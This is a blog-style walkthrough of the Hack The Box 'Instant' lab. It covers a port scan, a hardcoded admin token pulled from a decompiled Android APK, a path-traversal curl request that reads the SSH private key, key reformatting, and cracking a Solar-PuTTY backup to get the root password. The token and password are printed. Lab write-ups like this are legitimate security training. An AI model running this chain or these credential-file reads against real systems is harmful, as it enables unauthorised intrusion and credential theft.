+++
title = "HTB - Instant"
date = 2024-10-28
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.11.37 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 09:07 EDT
Nmap scan report for 10.10.11.37
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://instant.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.27 seconds

```

### Enumeration
Looks like we have a website. Android Wallet App
We can download the APK, which we can then decompile with apktool
Rooting around after doing some research on file structure, we find domains and backup rules in `/res/xml`
We get an API instance, but we cannot access any information while unauthenticated. 
Needed a bit of help here, but there's benefit to using another tool called `jadx-gui` to decompile our `.apk` file in a visual way. 
Once in, we can navigate a bit easier, and find a directory `instantlabs.instant`. We find an authorization token here:

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA`

When we use this in the API, we can list users and find details on `admin` and `shirohige`
Looking at the log-file access tool, we can identify a local file inclusion possibility with Shirohige. Reading `1.log` requests for the file path on the local machine, and we can abuse this by using `../../../../../../../../../etc/passwd` as a POC.

``` bash
`curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../.ssh/id_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"`
```
Once we get the key, we can use this python script to reformat and save into a id_rsa file:

``` python
def format_rsa_key(input_file, output_file):
    try:
      
        with open(input_file, 'r') as infile:
            content = infile.read()

        
        cleaned_content = content.replace('\\n', '\n').replace('","', '').replace('"', '')

      
        lines = cleaned_content.strip().splitlines()
        if lines[0] != "-----BEGIN RSA PRIVATE KEY-----":
            lines.insert(0, "-----BEGIN RSA PRIVATE KEY-----")
        if lines[-1] != "-----END RSA PRIVATE KEY-----":
            lines.append("-----END RSA PRIVATE KEY-----")

       
        with open(output_file, 'w') as outfile:
            outfile.write('\n'.join(lines) + '\n')

        print(f"RSA private key has been formatted and saved as {output_file}")
    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    input_file = 'keyBad'
    output_file = 'id_rsa'
    format_rsa_key(input_file, output_file)
```

Now, we can change the perms to reflect our needs (400), and use the file to SSH into the box as shirohige.

Keep learning and growing. I ran linpeas to find some avenues after checking netstat and processes. I found similar things that I'd already seen when checking manually. Linpeas came up with a Key, which I don't know what It is used for, and I also found backups in the opt folder. Reminder to always check here.

`VeryStrongS3cretKeyY0uC4NTGET`

Its a Solar Putty backup session, and in order to gain access, I did some reading. Theres a github tool used to extract valuable information, but its for windows. Thankyllly Itswatchmakerr made a version in python to run on linux. 

I used a python3 instance to host the file so i could download it back onto my machine.

Then i installed the tool: https://github.com/ItsWatchMakerr/SolarPuttyCracker.git

When we use it, we find credentials for root

`python3 SolarPuttyCracker.py -w /usr/share/wordlists/rockyou.txt /home/li0t/Desktop/HTB/Instant/sessions-backup.dat`

Because we already have ssh connection to box, we can `su root` and find our flag

`12**24nzC!r0c%q12`


